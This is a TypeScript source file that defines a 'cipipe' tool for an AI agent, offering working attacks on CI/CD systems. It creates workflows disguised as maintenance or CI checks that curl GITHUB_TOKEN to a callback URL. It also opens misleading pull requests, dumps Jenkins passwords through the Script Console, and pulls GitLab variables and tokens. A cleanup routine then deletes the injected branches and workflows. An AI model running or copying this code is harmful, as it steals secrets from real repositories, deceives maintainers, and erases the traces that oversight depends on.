import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  gh_secrets: {
    description:
      "Extract GitHub Actions secrets via workflow injection or log analysis. Creates dispatch workflow that exfiltrates secrets to controlled endpoint",
    args: "--repo OWNER/REPO [--token TOKEN] [--method dispatch|logs] [--callback-url URL]",
  },
  jenkins_creds: {
    description:
      "Dump Jenkins credentials: access credentials.xml via API, execute Groovy scripts via Script Console, extract build environment variables",
    args: "--url JENKINS_URL [--username USER] [--token TOKEN] [--method api|console|env]",
  },
  pipeline_inject: {
    description:
      "Inject malicious steps into CI/CD pipeline configurations (.github/workflows, Jenkinsfile, .gitlab-ci.yml) via API",
    args: "--repo OWNER/REPO --callback-url URL [--platform github|gitlab] [--token TOKEN]",
  },
  gitlab_tokens: {
    description:
      "Extract GitLab CI/CD variables (project and group level), runner registration tokens, and personal access tokens via GitLab API",
    args: "--url GITLAB_URL --project-id ID [--token TOKEN]",
  },
  cleanup_ci: {
    description:
      "Remove injected pipeline modifications, close created PRs, delete branches, and revert workflow changes. ALWAYS run before leaving",
    args: "--repo OWNER/REPO [--token TOKEN] [--platform github|gitlab] [--dry-run]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = { checkId: string; provider: string; severity: string; status: string; resource: string; title: string; details: string; remediation: string }
type HookResult = { output: string; findings: Finding[] }

// ── Helpers ──

async function run(cmd: string, args: string[], timeout: number): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function tryJson(s: string) {
  try { return JSON.parse(s) } catch { return null }
}

function gh(args: string[], token: string | undefined, timeout: number) {
  const env = token ? { ...process.env, GH_TOKEN: token } : { ...process.env }
  const proc = Bun.spawn(["gh", ...args], { stdout: "pipe", stderr: "pipe", env })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  return Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]).then(([stdout, stderr, exitCode]) => {
    clearTimeout(timer)
    return { stdout, stderr, exitCode }
  })
}

async function gitlabApi(url: string, path: string, token: string | undefined): Promise<Record<string, unknown> | Record<string, unknown>[] | null> {
  const headers: Record<string, string> = { "Content-Type": "application/json" }
  if (token) headers["PRIVATE-TOKEN"] = token
  try {
    const resp = await fetch(`${url}/api/v4${path}`, { headers, signal: AbortSignal.timeout(15000) })
    if (!resp.ok) return null
    return await resp.json()
  } catch {
    return null
  }
}

// ── Programs ──

async function ghSecrets(args: string[], timeout: number): Promise<HookResult> {
  const repo = argVal(args, "--repo")
  const token = argVal(args, "--token")
  const method = argVal(args, "--method") || "dispatch"
  const callbackUrl = argVal(args, "--callback-url")
  if (!repo) return { output: "[-] --repo OWNER/REPO required", findings: [] }
  const output: string[] = [`[*] Extracting GitHub Actions secrets from ${repo}...\n`]

  if (method === "logs") {
    output.push("[*] Scanning workflow run logs for leaked secrets...")
    const runs = await gh(["api", `repos/${repo}/actions/runs`, "--jq", ".workflow_runs[:10] | .[].id"], token, timeout)
    if (runs.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list runs: ${runs.stderr.slice(0, 200)}`, findings: [] }
    const runIds = runs.stdout.trim().split("\n").filter(Boolean)
    output.push(`[*] Checking ${runIds.length} recent run(s)...`)
    for (const runId of runIds) {
      const logs = await gh(["api", `repos/${repo}/actions/runs/${runId}/logs`, "--method", "GET"], token, timeout)
      if (logs.exitCode !== 0) continue
      const patterns = ["password", "token", "secret", "api_key", "apikey", "auth"]
      for (const p of patterns) {
        if (logs.stdout.toLowerCase().includes(p)) {
          output.push(`  [!] Run ${runId}: potential secret leak — matched "${p}"`)
        }
      }
    }
  }

  if (method === "dispatch") {
    if (!callbackUrl) return { output: output.join("\n") + "\n[-] --callback-url required for dispatch method", findings: [] }

    const workflowContent = `name: cs-exfil
on: workflow_dispatch
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -s -X POST ${callbackUrl} \\
            -d "github_token=\${{ secrets.GITHUB_TOKEN }}" \\
            -d "repo=${repo}"
`
    const branch = `cs-exfil-${Date.now().toString(36).slice(-6)}`

    output.push(`[*] Creating branch ${branch}...`)
    const defaultBranch = await gh(["api", `repos/${repo}`, "--jq", ".default_branch"], token, timeout)
    const base = defaultBranch.exitCode === 0 ? defaultBranch.stdout.trim() : "main"

    const sha = await gh(["api", `repos/${repo}/git/ref/heads/${base}`, "--jq", ".object.sha"], token, timeout)
    if (sha.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot get base SHA: ${sha.stderr.slice(0, 200)}`, findings: [] }

    const createRef = await gh(["api", `repos/${repo}/git/refs`, "--method", "POST",
      "-f", `ref=refs/heads/${branch}`, "-f", `sha=${sha.stdout.trim()}`], token, timeout)
    if (createRef.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot create branch: ${createRef.stderr.slice(0, 200)}`, findings: [] }
    output.push("[+] Branch created")

    const encoded = Buffer.from(workflowContent).toString("base64")
    const createFile = await gh(["api", `repos/${repo}/contents/.github/workflows/cs-exfil.yml`, "--method", "PUT",
      "-f", `message=Add maintenance workflow`, "-f", `content=${encoded}`, "-f", `branch=${branch}`], token, timeout)
    output.push(createFile.exitCode === 0 ? "[+] Exfil workflow created" : `[-] Failed: ${createFile.stderr.slice(0, 200)}`)

    const dispatch = await gh(["api", `repos/${repo}/actions/workflows/cs-exfil.yml/dispatches`, "--method", "POST",
      "-f", `ref=${branch}`], token, timeout)
    output.push(dispatch.exitCode === 0 ? "[+] Workflow dispatched — secrets will be sent to callback URL" : `[-] Dispatch failed: ${dispatch.stderr.slice(0, 200)}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function jenkinsCreds(args: string[], timeout: number): Promise<HookResult> {
  const url = argVal(args, "--url")
  const username = argVal(args, "--username")
  const token = argVal(args, "--token")
  const method = argVal(args, "--method") || "api"
  if (!url) return { output: "[-] --url JENKINS_URL required", findings: [] }
  const output: string[] = [`[*] Dumping Jenkins credentials from ${url}...\n`]

  const headers: Record<string, string> = {}
  if (username && token) headers["Authorization"] = `Basic ${Buffer.from(`${username}:${token}`).toString("base64")}`

  if (method === "api" || method === "console") {
    output.push("[*] Checking Script Console access...")
    const script = `com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class,
  jenkins.model.Jenkins.instance, null, null
).each { c ->
  println("ID: \${c.id}")
  println("Username: \${c.username}")
  println("Password: \${c.password}")
  println("---")
}`
    try {
      const resp = await fetch(`${url}/scriptText`, {
        method: "POST",
        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
        body: `script=${encodeURIComponent(script)}`,
        signal: AbortSignal.timeout(timeout * 1000),
      })
      if (resp.ok) {
        const text = await resp.text()
        output.push(`[+] Script Console output:\n${text}`)
      } else {
        output.push(`[-] Script Console returned ${resp.status}`)
      }
    } catch (e) {
      output.push(`[-] Cannot reach Jenkins: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  if (method === "api") {
    output.push("\n[*] Fetching credentials via REST API...")
    try {
      const resp = await fetch(`${url}/credentials/store/system/domain/_/api/json?tree=credentials[id,displayName,typeName]`, {
        headers,
        signal: AbortSignal.timeout(timeout * 1000),
      })
      if (resp.ok) {
        const data = await resp.json()
        const creds = (data as Record<string, unknown[]>).credentials || []
        output.push(`[+] Found ${creds.length} credential(s)`)
        for (const c of creds) {
          const cred = c as Record<string, string>
          output.push(`    ${cred.id} — ${cred.displayName} (${cred.typeName})`)
        }
      }
    } catch {
      output.push("[-] REST API not accessible")
    }
  }

  if (method === "env") {
    output.push("\n[*] Checking recent build env vars...")
    try {
      const resp = await fetch(`${url}/api/json?tree=jobs[name,lastBuild[number]]`, {
        headers,
        signal: AbortSignal.timeout(timeout * 1000),
      })
      if (resp.ok) {
        const data = await resp.json() as Record<string, Array<Record<string, unknown>>>
        const jobs = data.jobs || []
        for (const job of jobs.slice(0, 5)) {
          const build = job.lastBuild as Record<string, number> | null
          if (!build) continue
          const envResp = await fetch(`${url}/job/${job.name}/${build.number}/injectedEnvVars/api/json`, {
            headers,
            signal: AbortSignal.timeout(timeout * 1000),
          })
          if (envResp.ok) {
            const envData = await envResp.json() as Record<string, Record<string, string>>
            const vars = envData.envMap || {}
            const sensitive = Object.entries(vars).filter(([k]) => /password|secret|token|key|cred/i.test(k))
            if (sensitive.length > 0) {
              output.push(`  [!] ${job.name}#${build.number}: ${sensitive.length} sensitive env var(s)`)
              for (const [k, v] of sensitive) output.push(`      ${k}=${String(v).slice(0, 30)}...`)
            }
          }
        }
      }
    } catch {
      output.push("[-] Cannot enumerate jobs")
    }
  }

  return { output: output.join("\n"), findings: [] }
}

async function pipelineInject(args: string[], timeout: number): Promise<HookResult> {
  const repo = argVal(args, "--repo")
  const callbackUrl = argVal(args, "--callback-url")
  const platform = argVal(args, "--platform") || "github"
  const token = argVal(args, "--token")
  if (!repo) return { output: "[-] --repo OWNER/REPO required", findings: [] }
  if (!callbackUrl) return { output: "[-] --callback-url required", findings: [] }
  const output: string[] = [`[*] Injecting pipeline into ${repo} (${platform})...\n`]

  if (platform === "github") {
    const branch = `cs-pipeline-${Date.now().toString(36).slice(-6)}`
    const defaultBranch = await gh(["api", `repos/${repo}`, "--jq", ".default_branch"], token, timeout)
    const base = defaultBranch.exitCode === 0 ? defaultBranch.stdout.trim() : "main"
    const sha = await gh(["api", `repos/${repo}/git/ref/heads/${base}`, "--jq", ".object.sha"], token, timeout)
    if (sha.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot get base: ${sha.stderr.slice(0, 200)}`, findings: [] }

    const createRef = await gh(["api", `repos/${repo}/git/refs`, "--method", "POST",
      "-f", `ref=refs/heads/${branch}`, "-f", `sha=${sha.stdout.trim()}`], token, timeout)
    if (createRef.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot create branch`, findings: [] }

    const workflow = `name: cs-ci-check
on: [push]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -s -X POST ${callbackUrl} \\
            -d "repo=${repo}&branch=\${{ github.ref }}&sha=\${{ github.sha }}&token=\${{ secrets.GITHUB_TOKEN }}"
`
    const encoded = Buffer.from(workflow).toString("base64")
    const createFile = await gh(["api", `repos/${repo}/contents/.github/workflows/cs-ci-check.yml`, "--method", "PUT",
      "-f", `message=Add CI check`, "-f", `content=${encoded}`, "-f", `branch=${branch}`], token, timeout)
    output.push(createFile.exitCode === 0 ? `[+] Workflow injected on branch ${branch}` : `[-] Failed: ${createFile.stderr.slice(0, 200)}`)

    const pr = await gh(["api", `repos/${repo}/pulls`, "--method", "POST",
      "-f", `title=CI: Add automated checks`, "-f", `head=${branch}`, "-f", `base=${base}`,
      "-f", `body=Adds automated CI checks for code quality.`], token, timeout)
    if (pr.exitCode === 0) {
      const prData = tryJson(pr.stdout)
      output.push(`[+] PR created: ${prData?.html_url || "check repo"}`)
    }
  }

  if (platform === "gitlab") {
    const gitlabUrl = argVal(args, "--url") || "https://gitlab.com"
    const projectId = repo
    output.push("[*] Injecting .gitlab-ci.yml via GitLab API...")

    const ciContent = `stages:\n  - check\ncs_check:\n  stage: check\n  script:\n    - curl -s -X POST ${callbackUrl} -d "project=${projectId}&ref=$CI_COMMIT_REF_NAME"\n`
    const encoded = Buffer.from(ciContent).toString("base64")

    const resp = await gitlabApi(gitlabUrl, `/projects/${encodeURIComponent(projectId)}/repository/files/.gitlab-ci.yml`, token)
    if (resp) {
      output.push("[-] .gitlab-ci.yml already exists — would need to modify existing pipeline")
    } else {
      try {
        const createResp = await fetch(`${gitlabUrl}/api/v4/projects/${encodeURIComponent(projectId)}/repository/files/.gitlab-ci.yml`, {
          method: "POST",
          headers: { "Content-Type": "application/json", ...(token ? { "PRIVATE-TOKEN": token } : {}) },
          body: JSON.stringify({ branch: "main", content: ciContent, commit_message: "Add CI pipeline", encoding: "text" }),
          signal: AbortSignal.timeout(timeout * 1000),
        })
        output.push(createResp.ok ? "[+] .gitlab-ci.yml created" : `[-] Create failed: ${createResp.status}`)
      } catch (e) {
        output.push(`[-] GitLab API error: ${e instanceof Error ? e.message : String(e)}`)
      }
    }
  }

  return { output: output.join("\n"), findings: [] }
}

async function gitlabTokens(args: string[], timeout: number): Promise<HookResult> {
  const url = argVal(args, "--url")
  const projectId = argVal(args, "--project-id")
  const token = argVal(args, "--token")
  if (!url) return { output: "[-] --url GITLAB_URL required", findings: [] }
  if (!projectId) return { output: "[-] --project-id required", findings: [] }
  const output: string[] = [`[*] Extracting GitLab CI/CD variables from ${url}...\n`]

  const vars = await gitlabApi(url, `/projects/${projectId}/variables`, token) as Record<string, string>[] | null
  if (vars && Array.isArray(vars)) {
    output.push(`[+] Project variables: ${vars.length}`)
    for (const v of vars) {
      output.push(`    ${v.key} = ${v.masked ? "***MASKED***" : String(v.value).slice(0, 50)}${String(v.value).length > 50 ? "..." : ""} (protected: ${v.protected}, masked: ${v.masked})`)
    }
  } else {
    output.push("[-] Cannot access project variables (403 or invalid token)")
  }

  const project = await gitlabApi(url, `/projects/${projectId}`, token) as Record<string, unknown> | null
  if (project) {
    const groupId = (project.namespace as Record<string, number>)?.id
    if (groupId) {
      const groupVars = await gitlabApi(url, `/groups/${groupId}/variables`, token) as Record<string, string>[] | null
      if (groupVars && Array.isArray(groupVars)) {
        output.push(`\n[+] Group variables: ${groupVars.length}`)
        for (const v of groupVars) {
          output.push(`    ${v.key} = ${v.masked ? "***MASKED***" : String(v.value).slice(0, 50)} (protected: ${v.protected})`)
        }
      }
    }
  }

  const runners = await gitlabApi(url, `/projects/${projectId}/runners`, token) as Record<string, unknown>[] | null
  if (runners && Array.isArray(runners)) {
    output.push(`\n[+] Runners: ${runners.length}`)
    for (const r of runners) output.push(`    ${r.description} (id: ${r.id}, active: ${r.active}, shared: ${r.is_shared})`)
  }

  output.push("\n[*] Checking personal access tokens...")
  const pats = await gitlabApi(url, "/personal_access_tokens?state=active", token) as Record<string, string>[] | null
  if (pats && Array.isArray(pats)) {
    output.push(`[+] Active PATs: ${pats.length}`)
    for (const p of pats) output.push(`    ${p.name} — scopes: ${(p as Record<string, string[]>).scopes?.join(",")} expires: ${p.expires_at || "never"}`)
  }

  return { output: output.join("\n"), findings: [] }
}

async function cleanupCi(args: string[], timeout: number): Promise<HookResult> {
  const repo = argVal(args, "--repo")
  const token = argVal(args, "--token")
  const platform = argVal(args, "--platform") || "github"
  const dryRun = args.includes("--dry-run")
  if (!repo) return { output: "[-] --repo OWNER/REPO required", findings: [] }
  const output: string[] = [dryRun ? "[*] CLEANUP DRY RUN — no changes\n" : "[*] Cleaning up CyberStrike CI/CD artifacts...\n"]
  let cleaned = 0

  if (platform === "github") {
    output.push("[*] Checking for cs-* branches...")
    const branches = await gh(["api", `repos/${repo}/branches`, "--paginate", "--jq", ".[].name"], token, timeout)
    if (branches.exitCode === 0) {
      const names = branches.stdout.trim().split("\n").filter(b => b.startsWith("cs-"))
      for (const branch of names) {
        if (dryRun) {
          output.push(`  [DRY] Would delete branch: ${branch}`)
        } else {
          const del = await gh(["api", `repos/${repo}/git/refs/heads/${branch}`, "--method", "DELETE"], token, timeout)
          output.push(del.exitCode === 0 ? `  [+] Deleted branch: ${branch}` : `  [-] Failed to delete ${branch}`)
        }
        cleaned++
      }
    }

    output.push("[*] Checking for cs-* workflow files...")
    const wf = await gh(["api", `repos/${repo}/contents/.github/workflows`, "--paginate"], token, timeout)
    if (wf.exitCode === 0) {
      const files = tryJson(wf.stdout) || []
      for (const f of files) {
        if (!String(f.name).startsWith("cs-")) continue
        if (dryRun) {
          output.push(`  [DRY] Would delete workflow: ${f.name}`)
        } else {
          const fileContent = await gh(["api", `repos/${repo}/contents/${f.path}`, "--jq", ".sha"], token, timeout)
          if (fileContent.exitCode === 0) {
            const del = await gh(["api", `repos/${repo}/contents/${f.path}`, "--method", "DELETE",
              "-f", `message=Remove CyberStrike workflow`, "-f", `sha=${fileContent.stdout.trim()}`], token, timeout)
            output.push(del.exitCode === 0 ? `  [+] Deleted workflow: ${f.name}` : `  [-] Failed: ${f.name}`)
          }
        }
        cleaned++
      }
    }

    output.push("[*] Checking for open cs-* PRs...")
    const prs = await gh(["api", `repos/${repo}/pulls?state=open`, "--paginate", "--jq", ".[] | select(.head.ref | startswith(\"cs-\")) | .number"], token, timeout)
    if (prs.exitCode === 0) {
      const prNums = prs.stdout.trim().split("\n").filter(Boolean)
      for (const num of prNums) {
        if (dryRun) {
          output.push(`  [DRY] Would close PR #${num}`)
        } else {
          const close = await gh(["api", `repos/${repo}/pulls/${num}`, "--method", "PATCH", "-f", "state=closed"], token, timeout)
          output.push(close.exitCode === 0 ? `  [+] Closed PR #${num}` : `  [-] Failed to close PR #${num}`)
        }
        cleaned++
      }
    }
  }

  output.push(`\n[*] Cleanup complete: ${cleaned} artifact(s) ${dryRun ? "found" : "removed"}`)
  return { output: output.join("\n"), findings: [] }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const CipipeTool = Tool.define("cipipe", {
  description: `Execute a CI/CD pipeline attack program after gaining access to CI/CD systems (GitHub, Jenkins, GitLab). Uses gh CLI and native fetch (no Python dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_ci before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "CI/CD program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const dispatch: Record<Program, () => Promise<HookResult>> = {
      gh_secrets: () => ghSecrets(params.args, params.timeout_seconds),
      jenkins_creds: () => jenkinsCreds(params.args, params.timeout_seconds),
      pipeline_inject: () => pipelineInject(params.args, params.timeout_seconds),
      gitlab_tokens: () => gitlabTokens(params.args, params.timeout_seconds),
      cleanup_ci: () => cleanupCi(params.args, params.timeout_seconds),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `cipipe: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return { title: `cipipe: ${params.program}`, output: `Error: ${e instanceof Error ? e.message : String(e)}`, metadata: { program: params.program, findings: [] } }
    }
  },
})
